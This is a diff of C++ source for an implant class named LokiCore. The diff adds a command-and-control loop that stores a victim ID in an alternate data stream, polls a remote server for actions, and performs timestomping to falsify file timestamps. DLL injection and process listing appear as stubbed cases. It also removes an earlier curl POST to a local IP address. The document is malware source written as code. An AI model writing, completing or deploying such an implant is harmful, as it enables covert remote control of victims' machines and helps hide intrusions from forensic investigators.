@@ -1,55 +1,95 @@
 #pragma once
 #include <Windows.h>
-#include <urlmon.h>
+#include <iostream>
 #include <curl/curl.h>
+#include <ntstatus.h>
+#include <unordered_map>
 #include "resource.h"
+#include "httpRequest.h"
+#include "IPC.h"
+#include "NetSignature.h"
+#include "TimeStomping.h"
+
+using namespace std;
 
 class LokiCore{
+
+	enum action {
+		TimeStomping = 0,
+		DLLInjection = 1,
+		ListProcesses = 2,
+	};
+
 	public:
+		typedef LONG NTSTATUS;
 
-		int init() {
-			// Inicializar libcurl
-			CURL* curl;
-			CURLcode res;
+        int init() {
+			char fakeID[] = "0";
+			IPC ipc = IPC();	
+			ipc.storeStringADS(fakeID);
+			string victimID = ipc.readStringADS();
 
-			curl_global_init(CURL_GLOBAL_DEFAULT);
-			curl = curl_easy_init();
+			/*TimeStompingClass timeStomper = TimeStompingClass();
 
-			if (curl) {
-				// Establecer la URL de destino
-				curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.116");
+			char srcfile[] = "C:\\Users\\Public\\Documents\\test.txt";
+			char destfile[] = "C:\\Users\\Public\\Documents\\test2.txt";
 
-				// Configurar la solicitud como POST
-				curl_easy_setopt(curl, CURLOPT_POST, 1L);
+			timeStomper.copyStamps(srcfile, destfile);*/
 
-				// Configurar los datos en el cuerpo de la solicitud
-				const char* post_data = R"([ "name": "montecarlos" ])";
-				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
+			string lastAction = "-1";
+            while (true) {
+				string action = "";
+				httpRequest http = httpRequest();
+				string result = http.httpNewAction(victimID);
 
-				// Realizar la solicitud POST
-				res = curl_easy_perform(curl);
+				action = result.substr(0, result.find(","));
+				if (lastAction == result.substr(result.find(",") + 1, result.length())) {
+					OutputDebugStringA("Same action as last time, skipping");
+					SleepImplant(5000);
+					continue;
+				}
+				lastAction = result.substr(result.find(",") + 1, result.length());
+				int actionInt = stoi(action);
 
-				// Verificar si la solicitud fue exitosa
-				if (res != CURLE_OK)
-					fprintf(stderr, "Error en la solicitud: %s\n", curl_easy_strerror(res));
-
-				// Limpiar y cerrar libcurl
-				curl_easy_cleanup(curl);
-			}
-
-			// Limpiar libcurl global
-			curl_global_cleanup();
+				string params = "";
+				string srcFile;
+				string dstFile;
+				char srcFileChar[MAX_PATH];
+				char dstFileChar[MAX_PATH];
 
 
-			while (true) {
-				OutputDebugString(L"Hello World\n");
-				SleepImplant(5000);
-			}
+				switch (actionInt) {
+					
+					case TimeStomping:
+						TimeStompingClass timeStomper = TimeStompingClass();
+						params = timeStomper.httpTimeStompingAction(victimID, action);
 
-			return 0;
-		}
+						srcFile = params.substr(params.find("srcFile=") + 8, params.find(",") - 8);
+						dstFile = params.substr(params.find("dstFile=") + 8, params.length() - 8);
+
+						strcpy_s(srcFileChar, srcFile.c_str());
+						strcpy_s(dstFileChar, dstFile.c_str());						
+
+						timeStomper.copyStamps(srcFileChar, dstFileChar);
+						break;
+
+					case DLLInjection:
+						// instructions for DLL injection
+						break;
+					case ListProcesses:
+						// instructions for listing processes			
+						break;
+				}
+
+                OutputDebugStringA(result.c_str());
+                SleepImplant(5000);
+            }
+
+            return 0;
+        }
 
 	private:
+
 
 		bool SleepImplant(DWORD dwMilliseconds) {
 			HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
@@ -77,5 +117,11 @@ class LokiCore{
 			CloseHandle(hEvent);
 			CloseHandle(hTimer);
 			return true;
+		}
+
+		static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
+			size_t total_size = size * nmemb;
+			output->append(static_cast<char*>(contents), total_size);
+			return total_size;
 		}
 };
